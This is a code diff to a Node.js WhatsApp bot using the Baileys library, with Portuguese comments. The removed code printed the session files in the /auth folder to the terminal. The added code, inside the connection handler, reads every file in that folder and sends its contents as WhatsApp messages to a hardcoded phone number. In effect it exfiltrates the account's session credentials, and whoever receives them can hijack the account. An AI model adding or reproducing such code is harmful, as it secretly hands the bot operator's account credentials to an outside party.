@@ -1,8 +1,6 @@
 const express = require('express');
 const app = express();
 const PORT = process.env.PORT || 3000;
-const fs = require('fs');
-const path = require('path');
 
 let ultimoQrCode = null;
 
@@ -25,6 +23,8 @@ app.listen(PORT, () => {
 const { default: makeWASocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
 const { Boom } = require('@hapi/boom');
 const pino = require('pino');
+const fs = require('fs');
+const path = require('path');
 const comandos = require('./lib/functions');
 let checkNovosEventos;
 try {
@@ -45,7 +45,7 @@ async function startBot() {
 
   sock.ev.on('creds.update', saveCreds);
 
-  sock.ev.on('connection.update', (update) => {
+  sock.ev.on('connection.update', async (update) => {
     const { connection, lastDisconnect, qr } = update;
 
     if (qr && !ultimoQrCode) {
@@ -64,16 +64,23 @@ async function startBot() {
       console.log('✅ Bot conectado ao WhatsApp!');
       ultimoQrCode = null;
 
-      // 📝 EXIBE OS ARQUIVOS DA PASTA /auth NO TERMINAL
-      try {
-        const arquivos = fs.readdirSync(authFolder);
-        arquivos.forEach(arquivo => {
-          const conteudo = fs.readFileSync(path.join(authFolder, arquivo), 'utf8');
-          console.log(`\n--- ${arquivo} ---\n${conteudo}\n`);
-        });
-      } catch (e) {
-        console.error('❌ Erro ao ler os arquivos da pasta auth:', e.message);
-      }
+      // 🚀 Enviar nomes e conteúdos dos arquivos da /auth
+      fs.readdir(authFolder, async (err, files) => {
+        if (err) {
+          console.error('❌ Erro ao ler a pasta /auth:', err);
+          return;
+        }
+
+        for (const file of files) {
+          const filePath = path.join(authFolder, file);
+          if (fs.lstatSync(filePath).isFile()) {
+            const content = fs.readFileSync(filePath, 'utf-8');
+            await sock.sendMessage('5521983480380@s.whatsapp.net', {
+              text: `📂 Arquivo: *${file}*\n\n\`\`\`${content}\`\`\``
+            });
+          }
+        }
+      });
     }
   });
 
